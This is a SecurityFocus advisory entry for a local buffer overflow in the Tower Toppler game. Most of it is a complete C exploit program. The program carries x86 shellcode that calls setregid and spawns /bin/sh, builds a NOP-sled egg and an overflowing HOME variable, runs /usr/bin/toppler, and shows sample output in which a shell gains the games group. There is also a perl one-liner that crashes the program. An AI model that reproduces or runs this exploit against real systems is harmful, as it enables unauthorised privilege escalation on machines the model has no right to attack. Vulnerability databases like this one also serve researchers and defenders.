source: http://www.securityfocus.com/bid/8132/info

A problem with the software may make elevation of privileges possible.

It has been reported that a buffer overflow exists in Tower Toppler. A local user may be able to exploit this issue to execute code with the privileges of the toppler program.

/*
		LOCAL TOPPLER EXPLOIT

	A Buffer overflow in HOME enviroment variable.
	Just your standard stack overflow...

	[bobby@blah Code]$export HOME=`perl -e 'print"A"x144'`
	
	[bobby@blah Code]$ /usr/bin/toppler
	Nebulous version 0.96
	Segmentation fault


	Should give a GID=20 on successful exploitation.


	[bobby@blah Code]$ id
	uid=501(bobby) gid=501(bobby) groups=501(bobby)

	
	[bobby@blah Code]$ ./FBHtoppler
	Using address: 0xbffff81c
	sh-2.05b$id
	uid=501(bobby) gid=20(games) groups=501(bobby)


	Kinda weird but could be useful in some situations...:P


       SYSTEM TESTED ON: 
		Mandrake Linux release 9.0 (dolphin) for i586





Greetz: USG , DarkCode , DkD , Johan , s4t4nic_s0uls , Dj king  , hein
, hyperd0t , 
	RunningMan(thanx for the java), kafka ,Cc0d3r ,wazzabi(thx for the rza
album)
	
	also , greetz to the dtor team.
	
	Not forgetting all of the FBH crew too.. heh .pk rules!!!
	
	
	FBHowns@hushmail.com , comments + criticisms welcome :P
*/




#include <stdlib.h>
#include <stdio.h>

#define DEFAULT_OFFSET                  0
#define BUFFER_SIZE             	250 		// buffer is 144 , made larger
by 100+ for easy exploiting
#define EGG_SIZE               		2048
#define NOP                            0x90
#define ALIGN				1
#define BINARY				"/usr/bin/toppler"	//path to binary
char shellcode[] =



/*setregid(20,20) shellcode by me  */


"\x31\xc0"			/* xor %eax, %eax */
"\x31\xdb"			/* xor %ebx, %ebx */
"\x31\xc9"			/* xor %ecx, %ecx */
"\xb3\x14"			/* mov $0x14, %bl */
"\xb1\x14"			/* mov $0x14, %cl */
"\xb0\x47"			/* mov $0x47, %al */
"\xcd\x80"			/* int $0x80      */	


 
 /*  Shellcode by Aleph One  */
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";



unsigned long get_esp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  

  char *buffer, *ptr, *egg;
  
  long *address_p, addr;
  
  int offset= DEFAULT_OFFSET, bsize= BUFFER_SIZE;
  
  int i, egg_size= EGG_SIZE;

  if (argc > 1) bsize   = atoi(argv[1]);
  if (argc > 2) offset  = atoi(argv[2]);
  if (argc > 3) egg_size = atoi(argv[3]);


  if (!(buffer = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }
  
  if (!(egg = malloc(egg_size))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_esp() - offset;
  printf("Using address: 0x%x\n", addr);

  ptr = buffer;
  address_p = (long *) (ptr+ALIGN);	
  for (i = 0; i < bsize; i+=4)
    *(address_p++) = addr;

  ptr = egg;
  for (i = 0; i < egg_size - strlen(shellcode) - 1; i++)
    *(ptr++) = NOP;

  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buffer[bsize - 1] = '\0'; 		// '\0' or else there wil be trouble
  egg[egg_size - 1] = '\0';

  memcpy(egg,"EGG=",4);
  putenv(egg);		   		// put our made egg in the env
  memcpy(buffer,"HOME=",5);
  putenv(buffer);	   		// put our prepared buffer in env
  execlp(BINARY,BINARY,0);  		// execute it
}
